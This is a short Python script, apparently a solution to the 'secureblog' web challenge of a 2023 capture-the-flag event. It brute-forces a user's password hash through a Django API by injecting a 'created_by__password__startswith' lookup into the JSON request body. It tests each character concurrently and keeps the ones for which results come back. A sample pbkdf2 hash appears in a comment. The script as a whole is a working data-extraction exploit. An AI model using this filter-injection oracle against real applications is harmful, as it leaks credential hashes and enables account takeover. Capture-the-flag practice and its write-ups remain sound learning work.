import requests
import concurrent.futures

table_char = "_$/=+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
pass_words = 'pbkdf2_sha256'
# https://docs.djangoproject.com/en/4.2/topics/db/queries/#field-lookups-intro

# pbkdf2_sha256$1000$057C2I2qdGH98Hm2CSkiKZ$6Eq+K931+YFv4OV578LDDDyFoWEp2OClbcnRF1qxHjE=


def make_request(char):
    r = requests.post(
        "https://web-secureblog-38884aeae11a8a40.2023.ductf.dev/api/articles/?format=json",
        json={
            "created_by__password__startswith": pass_words + char
        }
    )
    response_json = r.json()
    return char, len(response_json)


for i in range(0, 20):
    results = []
    # Sử dụng concurrent.futures để gửi các yêu cầu đồng thời
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(table_char)) as executor:
        # Sử dụng list comprehension để gửi các yêu cầu và nhận kết quả
        results = list(executor.map(make_request, table_char))

    for char, response_length in results:
        if response_length > 1:
            pass_words += char

    print(pass_words)
